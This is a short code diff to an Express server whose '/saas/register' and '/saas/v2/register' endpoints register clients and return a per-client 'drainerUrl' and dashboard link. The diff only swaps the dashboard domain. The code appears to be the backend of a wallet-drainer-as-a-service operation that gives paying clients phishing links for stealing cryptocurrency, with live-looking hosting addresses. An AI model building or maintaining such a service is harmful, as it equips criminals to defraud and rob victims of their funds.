@@ -108,7 +108,7 @@ app.post('/saas/register', (req, res) => {
   success: true,
   clientId: clientId,
   drainerUrl: `https://ch.xqx.workers.dev/?client=${clientId}`,
-  dashboardUrl: `https://service-cheetah.netlify.app/dashboard.html?client=${clientId}`,
+  dashboardUrl: `https://ch-clients.netlify.app/dashboard.html?client=${clientId}`,
   message: 'Client registered successfully'
 });
     
@@ -195,7 +195,7 @@ app.post('/saas/v2/register', (req, res) => {
   success: true,
   clientId: clientId,
   drainerUrl: `https://ch.xqx.workers.dev/?client=${clientId}`,
-  dashboardUrl: `https://service-cheetah.netlify.app/dashboard.html?client=${clientId}`,
+  dashboardUrl: `https://ch-clients.netlify.app/dashboard.html?client=${clientId}`,
   message: 'Client registered successfully'
 });
     
